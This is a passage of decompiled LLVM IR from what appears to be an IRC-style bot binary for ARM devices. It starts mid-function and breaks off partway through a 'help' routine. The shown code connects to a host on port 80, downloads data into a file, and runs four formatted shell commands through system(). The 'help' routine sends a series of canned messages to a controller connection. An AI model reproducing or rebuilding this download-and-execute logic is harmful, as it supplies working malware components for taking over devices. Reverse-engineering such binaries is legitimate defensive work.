  br label %dec_label_pc_1937c

dec_label_pc_1934c:                               ; preds = %dec_label_pc_192e0
  %v4_19358 = load i32, i32* %stack_var_-6240, align 4
  %v1_1935c = add i32 %v4_19358, 4
  %v1_19360 = inttoptr i32 %v1_1935c to i32*
  %v2_19360 = load i32, i32* %v1_19360, align 4
  store i32 %v2_19360, i32* @r1, align 4
  %v2_19378 = bitcast i32* %stack_var_-1108 to i8*
  %v3_19378 = call i32 @strcpy(i8* %v2_19378, i32 %v2_19360)
  br label %dec_label_pc_1937c

dec_label_pc_1937c:                               ; preds = %dec_label_pc_19314, %dec_label_pc_1934c
  %.pre-phi = phi i8* [ %v2_19344, %dec_label_pc_19314 ], [ %v2_19378, %dec_label_pc_1934c ]
  %v2_193a0.pre-phi = ptrtoint i32* %stack_var_-1108 to i32
  br label %dec_label_pc_19394

dec_label_pc_19388:                               ; preds = %dec_label_pc_193b8
  %v1_1938c = add i32 %storemerge5, 1
  br label %dec_label_pc_19394

dec_label_pc_19394:                               ; preds = %dec_label_pc_1937c, %dec_label_pc_19388
  %storemerge5 = phi i32 [ 0, %dec_label_pc_1937c ], [ %v1_1938c, %dec_label_pc_19388 ]
  store i32 %storemerge5, i32* @r4, align 4
  %v3_193a8 = call i32 @strlen(i8* %.pre-phi)
  %v0_193b0 = load i32, i32* @r4, align 4
  %v3_193b0 = icmp ult i32 %v0_193b0, %v3_193a8
  br i1 %v3_193b0, label %dec_label_pc_193b8, label %dec_label_pc_193dc

dec_label_pc_193b8:                               ; preds = %dec_label_pc_19394
  store i32 %v2_191dc, i32* %r1.global-to-local, align 4
  %v2_193c8 = add i32 %storemerge5, %v2_191dc
  %v2_193cc = add i32 %v2_193c8, -1084
  %v1_193d0 = inttoptr i32 %v2_193cc to i8*
  %v2_193d0 = load i8, i8* %v1_193d0, align 1
  %v7_193d4 = icmp eq i8 %v2_193d0, 47
  br i1 %v7_193d4, label %dec_label_pc_193dc, label %dec_label_pc_19388

dec_label_pc_193dc:                               ; preds = %dec_label_pc_19394, %dec_label_pc_193b8
  %v2_193ec = add i32 %v2_191dc, -1084
  %v2_193f0 = add i32 %v2_193ec, %storemerge5
  %v3_193f8 = inttoptr i32 %v2_193f0 to i8*
  store i8 0, i8* %v3_193f8, align 1
  store i32 2, i32* %stack_var_-84, align 4
  %v1_19408 = call i32 @__GI_htons(i32 80)
  store i32 %v2_193a0.pre-phi, i32* @r0, align 4
  %v1_19424 = call i32 @inet_addr(i32 %v2_193a0.pre-phi)
  %v3_19434 = icmp eq i32 %v1_19424, -1
  br i1 %v3_19434, label %dec_label_pc_1943c, label %dec_label_pc_194c0

dec_label_pc_1943c:                               ; preds = %dec_label_pc_193dc
  store i32 %v2_193a0.pre-phi, i32* @r0, align 4
  %v1_1944c = call i32 @__GI_gethostbyname(i32 %v2_193a0.pre-phi)
  %v2_1945c = icmp eq i32 %v1_1944c, 0
  br i1 %v2_1945c, label %dec_label_pc_19464, label %dec_label_pc_19494

dec_label_pc_19464:                               ; preds = %dec_label_pc_1943c
  store i32 %v2_191dc, i32* @lr, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32), i32* %r1.global-to-local, align 4
  %v4_19484 = load i32, i32* %v4_191f0, align 4
  store i32 %v4_19484, i32* @r2, align 4
  %v3_19488 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32))
  %v1_19490 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %dec_label_pc_1943c, %dec_label_pc_19464
  %v1_19498 = add i32 %v1_1944c, 16
  %v2_19498 = inttoptr i32 %v1_19498 to i32*
  %v3_19498 = load i32, i32* %v2_19498, align 4
  %v1_1949c = inttoptr i32 %v3_19498 to i32*
  %v2_1949c = load i32, i32* %v1_1949c, align 4
  store i32 %v2_1949c, i32* @r1, align 4
  %v1_194a4 = add i32 %v1_1944c, 12
  %v2_194a4 = inttoptr i32 %v1_194a4 to i32*
  %v3_194a4 = load i32, i32* %v2_194a4, align 4
  store i32 %v3_194a4, i32* @r2, align 4
  %v2_194b0 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_194b0, i32* @r3, align 4
  store i32 %v2_194b0, i32* @r0, align 4
  %v0_194b8 = call i32 @memcpy()
  br label %dec_label_pc_194c8

dec_label_pc_194c0:                               ; preds = %dec_label_pc_193dc
  store i32 %v1_19424, i32* %stack_var_-80, align 4
  br label %dec_label_pc_194c8

dec_label_pc_194c8:                               ; preds = %dec_label_pc_19494, %dec_label_pc_194c0
  %v2_194cc = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_194cc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_194dc = call i32 @__GI_memset()
  %v2_194e0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_194e0, i32* %r1.global-to-local, align 4
  %v3_194f0 = call i32 @connect(i32 %v3_19298, i32 %v2_194e0, i32 16)
  %v2_194f8 = icmp eq i32 %v3_194f0, 0
  br i1 %v2_194f8, label %dec_label_pc_19530, label %dec_label_pc_19500

dec_label_pc_19500:                               ; preds = %dec_label_pc_194c8
  store i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_191dc, i32* @lr, align 4
  %v4_19520 = load i32, i32* %v4_191f0, align 4
  store i32 %v4_19520, i32* @r2, align 4
  %v3_19524 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32))
  %v1_1952c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_19530

dec_label_pc_19530:                               ; preds = %dec_label_pc_194c8, %dec_label_pc_19500
  %v2_19544 = or i32 %v2_193a0.pre-phi, 1
  %v1_19548 = add i32 %v2_19544, %storemerge5
  store i32 %v1_19548, i32* @r2, align 4
  store i32 ptrtoint ([277 x i8]* @global_var_38d14.920 to i32), i32* %r1.global-to-local, align 4
  %v3_19560 = call i32 @Send(i32 %v3_19298, i32 ptrtoint ([277 x i8]* @global_var_38d14.920 to i32))
  store i32 ptrtoint ([28 x i8]* @global_var_36cc4.69 to i32), i32* %r1.global-to-local, align 4
  %v4_19584 = load i32, i32* %v4_191f0, align 4
  store i32 %v4_19584, i32* @r2, align 4
  %v3_19588 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_36cc4.69 to i32))
  %v4_19598 = load i32, i32* %stack_var_-6240, align 4
  %v1_1959c = add i32 %v4_19598, 8
  %v1_195a0 = inttoptr i32 %v1_1959c to i32*
  %v2_195a0 = load i32, i32* %v1_195a0, align 4
  store i32 %v2_195a0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32), i32* @r1, align 4
  %v3_195ac = call i32 @__GI_fopen(i32 %v2_195a0, i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32))
  %v2_195c0 = ptrtoint i32* %stack_var_-5204 to i32
  br label %dec_label_pc_195b8

dec_label_pc_195b8:                               ; preds = %dec_label_pc_1974c, %dec_label_pc_19530
  store i32 %v2_195c0, i32* %r1.global-to-local, align 4
  %v4_195d4 = call i32 @recv(i32 %v3_19298, i32 %v2_195c0, i32 4096, i32 0)
  %tmp64 = icmp slt i32 %v4_195d4, 1
  br i1 %tmp64, label %dec_label_pc_1976c.loopexit9, label %dec_label_pc_195ec

dec_label_pc_195ec:                               ; preds = %dec_label_pc_195b8
  %v8_195fc = icmp sgt i32 %v4_195d4, 4095
  br i1 %v8_195fc, label %dec_label_pc_1962c.lr.ph, label %dec_label_pc_19600

dec_label_pc_19600:                               ; preds = %dec_label_pc_195ec
  store i32 %v2_191dc, i32* @lr, align 4
  %v2_19614 = add i32 %v4_195d4, %v2_195c0
  %v3_1961c = inttoptr i32 %v2_19614 to i8*
  store i8 0, i8* %v3_1961c, align 1
  br label %dec_label_pc_1962c.lr.ph

dec_label_pc_1962c.lr.ph:                         ; preds = %dec_label_pc_19600, %dec_label_pc_195ec
  br label %dec_label_pc_1962c

dec_label_pc_1962c:                               ; preds = %dec_label_pc_1962c.lr.ph, %dec_label_pc_1974c
  %storemerge699 = phi i32 [ 0, %dec_label_pc_1962c.lr.ph ], [ %v1_19750, %dec_label_pc_1974c ]
  %v2_19640 = add i32 %storemerge699, %v2_195c0
  store i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32* @r1, align 4
  %v4_19650 = inttoptr i32 %v2_19640 to i8*
  %v5_19650 = call i32 @__GI_strncmp(i8* %v4_19650, i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32 4)
  %v2_19658 = icmp eq i32 %v5_19650, 0
  br i1 %v2_19658, label %dec_label_pc_19660, label %dec_label_pc_1974c

dec_label_pc_19660:                               ; preds = %dec_label_pc_1962c
  %v1_19664 = add i32 %storemerge699, 4
  %v1_1967c = add i32 %v3_195ac, 52
  %v2_1967c = inttoptr i32 %v1_1967c to i32*
  %v1_1968c = add i32 %v3_195ac, 16
  %v2_1968c = inttoptr i32 %v1_1968c to i32*
  %v1_19694 = add i32 %v3_195ac, 28
  %v2_19694 = inttoptr i32 %v1_19694 to i32*
  %v5_1974488 = icmp slt i32 %v1_19664, %v4_195d4
  br i1 %v5_1974488, label %dec_label_pc_19670, label %dec_label_pc_1976c

dec_label_pc_19670:                               ; preds = %dec_label_pc_19660, %dec_label_pc_1972c
  %storemerge789 = phi i32 [ %v1_19730, %dec_label_pc_1972c ], [ %v1_19664, %dec_label_pc_19660 ]
  %v3_1967c = load i32, i32* %v2_1967c, align 4
  %v2_19680 = icmp eq i32 %v3_1967c, 0
  br i1 %v2_19680, label %dec_label_pc_19704, label %dec_label_pc_19688

dec_label_pc_19688:                               ; preds = %dec_label_pc_19670
  %v3_1968c = load i32, i32* %v2_1968c, align 4
  %v3_19694 = load i32, i32* %v2_19694, align 4
  %v3_19698 = icmp ult i32 %v3_1968c, %v3_19694
  br i1 %v3_19698, label %dec_label_pc_196a0, label %dec_label_pc_196d8

dec_label_pc_196a0:                               ; preds = %dec_label_pc_19688
  %v3_196a4 = load i32, i32* %v2_1968c, align 4
  store i32 %v3_196a4, i32* %r1.global-to-local, align 4
  %v2_196bc = add i32 %storemerge789, %v2_195c0
  %v1_196c0 = inttoptr i32 %v2_196bc to i8*
  %v2_196c0 = load i8, i8* %v1_196c0, align 1
  %v3_196c4 = inttoptr i32 %v3_196a4 to i8*
  store i8 %v2_196c0, i8* %v3_196c4, align 1
  %v0_196c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_196c8 = add i32 %v0_196c8, 1
  store i32 %v1_196c8, i32* %v2_1968c, align 4
  br label %dec_label_pc_1972c

dec_label_pc_196d8:                               ; preds = %dec_label_pc_19688
  store i32 %v2_191dc, i32* %r1.global-to-local, align 4
  %v2_196ec = add i32 %storemerge789, %v2_195c0
  %v1_196f0 = inttoptr i32 %v2_196ec to i8*
  %v2_196f0 = load i8, i8* %v1_196f0, align 1
  store i32 %v3_195ac, i32* %r1.global-to-local, align 4
  %v3_196fc = call i32 @putc_unlocked(i8 %v2_196f0, i32 %v3_195ac)
  br label %dec_label_pc_1972c

dec_label_pc_19704:                               ; preds = %dec_label_pc_19670
  %v2_19718 = add i32 %storemerge789, %v2_195c0
  %v1_1971c = inttoptr i32 %v2_19718 to i8*
  %v2_1971c = load i8, i8* %v1_1971c, align 1
  %v3_1971c = zext i8 %v2_1971c to i32
  store i32 %v3_195ac, i32* %r1.global-to-local, align 4
  %v3_19728 = call i32 @__GI_fputc(i32 %v3_1971c, i32 %v3_195ac, i32 %storemerge789)
  br label %dec_label_pc_1972c

dec_label_pc_1972c:                               ; preds = %dec_label_pc_196d8, %dec_label_pc_196a0, %dec_label_pc_19704
  %v1_19730 = add i32 %storemerge789, 1
  %v5_19744 = icmp slt i32 %v1_19730, %v4_195d4
  br i1 %v5_19744, label %dec_label_pc_19670, label %dec_label_pc_1976c

dec_label_pc_1974c:                               ; preds = %dec_label_pc_1962c
  %v1_19750 = add nuw nsw i32 %storemerge699, 1
  %v5_19764 = icmp slt i32 %v1_19750, %v4_195d4
  br i1 %v5_19764, label %dec_label_pc_1962c, label %dec_label_pc_195b8

dec_label_pc_1976c.loopexit9:                     ; preds = %dec_label_pc_195b8
  %.pre = add i32 %v3_195ac, 52
  %.pre17 = inttoptr i32 %.pre to i32*
  %.pre18 = add i32 %v3_195ac, 16
  %.pre19 = inttoptr i32 %.pre18 to i32*
  %.pre20 = add i32 %v3_195ac, 28
  %.pre21 = inttoptr i32 %.pre20 to i32*
  br label %dec_label_pc_1976c

dec_label_pc_1976c:                               ; preds = %dec_label_pc_19660, %dec_label_pc_1972c, %dec_label_pc_1976c.loopexit9
  %v2_19848.pre-phi = phi i32* [ %.pre21, %dec_label_pc_1976c.loopexit9 ], [ %v2_19694, %dec_label_pc_1972c ], [ %v2_19694, %dec_label_pc_19660 ]
  %v2_19840.pre-phi = phi i32* [ %.pre19, %dec_label_pc_1976c.loopexit9 ], [ %v2_1968c, %dec_label_pc_1972c ], [ %v2_1968c, %dec_label_pc_19660 ]
  %v2_19830.pre-phi = phi i32* [ %.pre17, %dec_label_pc_1976c.loopexit9 ], [ %v2_1967c, %dec_label_pc_1972c ], [ %v2_1967c, %dec_label_pc_19660 ]
  store i32 %v2_191dc, i32* @lr, align 4
  store i32 ptrtoint ([39 x i8]* @global_var_38e2c.925 to i32), i32* %r1.global-to-local, align 4
  %v4_197a4 = load i32, i32* %v4_191f0, align 4
  store i32 %v4_197a4, i32* @r2, align 4
  %v3_197ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_38e2c.925 to i32))
  br label %dec_label_pc_197b0

dec_label_pc_197b0:                               ; preds = %dec_label_pc_198e0, %dec_label_pc_1976c
  store i32 %v2_195c0, i32* %r1.global-to-local, align 4
  %v4_197cc = call i32 @recv(i32 %v3_19298, i32 %v2_195c0, i32 4096, i32 0)
  %tmp66 = icmp slt i32 %v4_197cc, 1
  br i1 %tmp66, label %dec_label_pc_19900, label %dec_label_pc_197e4

dec_label_pc_197e4:                               ; preds = %dec_label_pc_197b0
  %v8_197f4 = icmp sgt i32 %v4_197cc, 4095
  br i1 %v8_197f4, label %dec_label_pc_19824.lr.ph, label %dec_label_pc_197f8

dec_label_pc_197f8:                               ; preds = %dec_label_pc_197e4
  %v2_1980c = add i32 %v4_197cc, %v2_195c0
  %v3_19814 = inttoptr i32 %v2_1980c to i8*
  store i8 0, i8* %v3_19814, align 1
  br label %dec_label_pc_19824.lr.ph

dec_label_pc_19824.lr.ph:                         ; preds = %dec_label_pc_197f8, %dec_label_pc_197e4
  br label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %dec_label_pc_19824.lr.ph, %dec_label_pc_198e0
  %storemerge879 = phi i32 [ 0, %dec_label_pc_19824.lr.ph ], [ %v1_198e4, %dec_label_pc_198e0 ]
  %v3_19830 = load i32, i32* %v2_19830.pre-phi, align 4
  %v2_19834 = icmp eq i32 %v3_19830, 0
  br i1 %v2_19834, label %dec_label_pc_198b8, label %dec_label_pc_1983c

dec_label_pc_1983c:                               ; preds = %dec_label_pc_19824
  %v3_19840 = load i32, i32* %v2_19840.pre-phi, align 4
  %v3_19848 = load i32, i32* %v2_19848.pre-phi, align 4
  %v3_1984c = icmp ult i32 %v3_19840, %v3_19848
  br i1 %v3_1984c, label %dec_label_pc_19854, label %dec_label_pc_1988c

dec_label_pc_19854:                               ; preds = %dec_label_pc_1983c
  %v3_19858 = load i32, i32* %v2_19840.pre-phi, align 4
  store i32 %v3_19858, i32* %r1.global-to-local, align 4
  store i32 %v2_191dc, i32* @lr, align 4
  %v2_19870 = add i32 %storemerge879, %v2_195c0
  %v1_19874 = inttoptr i32 %v2_19870 to i8*
  %v2_19874 = load i8, i8* %v1_19874, align 1
  %v3_19878 = inttoptr i32 %v3_19858 to i8*
  store i8 %v2_19874, i8* %v3_19878, align 1
  %v0_1987c = load i32, i32* %r1.global-to-local, align 4
  %v1_1987c = add i32 %v0_1987c, 1
  store i32 %v1_1987c, i32* %v2_19840.pre-phi, align 4
  br label %dec_label_pc_198e0

dec_label_pc_1988c:                               ; preds = %dec_label_pc_1983c
  %v2_198a0 = add i32 %storemerge879, %v2_195c0
  %v1_198a4 = inttoptr i32 %v2_198a0 to i8*
  %v2_198a4 = load i8, i8* %v1_198a4, align 1
  store i32 %v3_195ac, i32* %r1.global-to-local, align 4
  %v3_198b0 = call i32 @putc_unlocked(i8 %v2_198a4, i32 %v3_195ac)
  br label %dec_label_pc_198e0

dec_label_pc_198b8:                               ; preds = %dec_label_pc_19824
  store i32 %v2_191dc, i32* %r1.global-to-local, align 4
  %v2_198cc = add i32 %storemerge879, %v2_195c0
  %v1_198d0 = inttoptr i32 %v2_198cc to i8*
  %v2_198d0 = load i8, i8* %v1_198d0, align 1
  %v3_198d0 = zext i8 %v2_198d0 to i32
  store i32 %v3_195ac, i32* %r1.global-to-local, align 4
  %v3_198dc = call i32 @__GI_fputc(i32 %v3_198d0, i32 %v3_195ac, i32 %storemerge879)
  br label %dec_label_pc_198e0

dec_label_pc_198e0:                               ; preds = %dec_label_pc_1988c, %dec_label_pc_19854, %dec_label_pc_198b8
  %v1_198e4 = add nuw nsw i32 %storemerge879, 1
  %v5_198f8 = icmp slt i32 %v1_198e4, %v4_197cc
  br i1 %v5_198f8, label %dec_label_pc_19824, label %dec_label_pc_197b0

dec_label_pc_19900:                               ; preds = %dec_label_pc_197b0
  %v1_19904 = inttoptr i32 %v3_195ac to i16*
  %v2_19904 = call i32 @__GI_fclose(i16* %v1_19904)
  %v1_1990c = call i32 @close(i32 %v3_19298)
  %v4_1991c = load i32, i32* %stack_var_-6240, align 4
  %v1_19920 = add i32 %v4_1991c, 8
  %v1_19924 = inttoptr i32 %v1_19920 to i32*
  %v2_19924 = load i32, i32* %v1_19924, align 4
  %v2_19948 = ptrtoint i32* %stack_var_-5459 to i32
  store i32 %v2_19948, i32* @r0, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_38e54.927 to i32), i32* %r1.global-to-local, align 4
  %v4_19958 = call i32 @sprintf(i32 %v2_19948, i32 ptrtoint ([21 x i8]* @global_var_38e54.927 to i32), i32 %v2_19924)
  %v1_1996c = call i32 @system(i32 %v2_19948)
  store i32 %v2_191dc, i32* @lr, align 4
  %v4_1997c = load i32, i32* %stack_var_-6240, align 4
  %v1_19980 = add i32 %v4_1997c, 8
  %v1_19984 = inttoptr i32 %v1_19980 to i32*
  %v2_19984 = load i32, i32* %v1_19984, align 4
  %v2_19990 = ptrtoint i32* %stack_var_-5714 to i32
  store i32 %v2_19990, i32* @r0, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_38e6c.929 to i32), i32* %r1.global-to-local, align 4
  %v4_1999c = call i32 @sprintf(i32 %v2_19990, i32 ptrtoint ([9 x i8]* @global_var_38e6c.929 to i32), i32 %v2_19984)
  %v1_199b0 = call i32 @system(i32 %v2_19990)
  %v4_199c0 = load i32, i32* %stack_var_-6240, align 4
  %v1_199c4 = add i32 %v4_199c0, 8
  %v1_199c8 = inttoptr i32 %v1_199c4 to i32*
  %v2_199c8 = load i32, i32* %v1_199c8, align 4
  %v2_199d4 = ptrtoint i32* %stack_var_-5969 to i32
  store i32 %v2_199d4, i32* @r0, align 4
  store i32 ptrtoint ([22 x i8]* @global_var_38e78.931 to i32), i32* %r1.global-to-local, align 4
  %v4_199e0 = call i32 @sprintf(i32 %v2_199d4, i32 ptrtoint ([22 x i8]* @global_var_38e78.931 to i32), i32 %v2_199c8)
  %v1_199f4 = call i32 @system(i32 %v2_199d4)
  store i32 %v2_191dc, i32* %r1.global-to-local, align 4
  %v4_19a04 = load i32, i32* %stack_var_-6240, align 4
  %v1_19a08 = add i32 %v4_19a04, 8
  %v1_19a0c = inttoptr i32 %v1_19a08 to i32*
  %v2_19a0c = load i32, i32* %v1_19a0c, align 4
  %v2_19a18 = ptrtoint i32* %stack_var_-6224 to i32
  store i32 %v2_19a18, i32* @r0, align 4
  store i32 ptrtoint ([18 x i8]* @global_var_38e90.933 to i32), i32* %r1.global-to-local, align 4
  %v4_19a24 = call i32 @sprintf(i32 %v2_19a18, i32 ptrtoint ([18 x i8]* @global_var_38e90.933 to i32), i32 %v2_19a0c)
  %v1_19a38 = call i32 @system(i32 %v2_19a18)
  %v1_19a40 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_19a44

dec_label_pc_19a44:                               ; preds = %entry, %dec_label_pc_19900
  %v1_19a4c = phi i32 [ %v1_19234, %entry ], [ %v1_19a40, %dec_label_pc_19900 ]
  ret i32 %v1_19a4c

; uselistorder directives
  uselistorder i32 %v2_19a18, { 0, 2, 1 }
  uselistorder i32 %v2_199d4, { 0, 2, 1 }
  uselistorder i32 %v2_19990, { 0, 2, 1 }
  uselistorder i32 %v2_19948, { 0, 2, 1 }
  uselistorder i32 %storemerge879, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v4_197cc, { 1, 0, 2, 3 }
  uselistorder i32* %v2_19840.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v1_19730, { 1, 0 }
  uselistorder i32 %storemerge789, { 1, 0, 4, 3, 2 }
  uselistorder i32 %storemerge699, { 1, 0, 2 }
  uselistorder i32 %v4_195d4, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_195c0, { 0, 1, 2, 3, 10, 9, 4, 5, 6, 7, 8, 12, 11 }
  uselistorder i32 %v3_195ac, { 14, 13, 12, 11, 10, 0, 1, 2, 8, 7, 4, 3, 6, 5, 9 }
  uselistorder i32 %v2_194e0, { 1, 0 }
  uselistorder i32 %storemerge5, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_193a0.pre-phi, { 0, 2, 1, 4, 3 }
  uselistorder i32* %v4_191f0, { 2, 3, 1, 4, 5, 0, 6, 7 }
  uselistorder i32 %v2_191dc, { 9, 10, 8, 7, 11, 6, 5, 4, 12, 1, 0, 3, 13, 2, 14, 15, 16 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_fputc, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([28 x i8]* @global_var_36cc4.69 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -1084, { 0, 3, 1, 4, 5, 6, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_36b58.61 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([37 x i8]* @global_var_36b30.59 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_19a44, { 1, 0 }
  uselistorder label %dec_label_pc_198e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19824, { 1, 0 }
  uselistorder label %dec_label_pc_1976c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1972c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19670, { 1, 0 }
  uselistorder label %dec_label_pc_1962c, { 1, 0 }
  uselistorder label %dec_label_pc_19530, { 1, 0 }
  uselistorder label %dec_label_pc_194c8, { 1, 0 }
  uselistorder label %dec_label_pc_19494, { 1, 0 }
  uselistorder label %dec_label_pc_193dc, { 1, 0 }
  uselistorder label %dec_label_pc_19394, { 1, 0 }
  uselistorder label %dec_label_pc_1937c, { 1, 0 }
  uselistorder label %dec_label_pc_192e0, { 1, 0 }
  uselistorder label %dec_label_pc_1928c, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 105112, i32* %stack_var_-4, align 4
  %v2_19a94 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_19a94, i32* @fp, align 4
  %v1_19ab0 = call i32 @mfork(i32 %arg2)
  %v2_19ab8 = icmp eq i32 %v1_19ab0, 0
  br i1 %v2_19ab8, label %dec_label_pc_19ac0, label %dec_label_pc_19f48

dec_label_pc_19ac0:                               ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_19acc = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_38ea4.935 to i32))
  %v1_19ad4 = call i32 @sleep(i32 3)
  store i32 %arg2, i32* @r2, align 4
  %v3_19ae4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_38edc.937 to i32))
  %v1_19aec = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19afc = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_38f24.939 to i32))
  %v1_19b04 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b14 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_38f78.941 to i32))
  %v1_19b1c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b2c = call i32 @Send(i32 %arg1, i32 ptrtoint ([74 x i8]* @global_var_38fcc.943 to i32))
  %v1_19b34 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_39018.945 to i32))
  %v1_19b4c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b5c = call i32 @Send(i32 %arg1, i32 ptrtoint ([143 x i8]* @global_var_39064.947 to i32))
  %v1_19b64 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_390f4.949 to i32))
  %v1_19b7c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19b8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_39160.951 to i32))
  %v1_19b94 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19ba4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_3919c.953 to i32))
  %v1_19bac = call i32 @sleep(i32 3)
  store i32 %arg2, i32* @r2, align 4
  %v3_19bbc = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_391c0.955 to i32))
  %v1_19bc4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19bd4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([124 x i8]* @global_var_391fc.957 to i32))
  %v1_19bdc = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19bec = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_39278.959 to i32))
  %v1_19bf4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([166 x i8]* @global_var_392e4.961 to i32))
  %v1_19c0c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([95 x i8]* @global_var_3938c.963 to i32))
  %v1_19c24 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_393ec.965 to i32))
  %v1_19c3c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c4c = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_3947c.967 to i32))
  %v1_19c54 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([152 x i8]* @global_var_394d4.969 to i32))
  %v1_19c6c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c7c = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_3956c.971 to i32))
  %v1_19c84 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19c94 = call i32 @Send(i32 %arg1, i32 ptrtoint ([159 x i8]* @global_var_395e0.973 to i32))
  %v1_19c9c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19cac = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_39680.975 to i32))
  %v1_19cb4 = call i32 @sleep(i32 3)
  store i32 %arg2, i32* @r2, align 4
  %v3_19cc4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_3969c.977 to i32))
  %v1_19ccc = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19cdc = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_396d4.979 to i32))
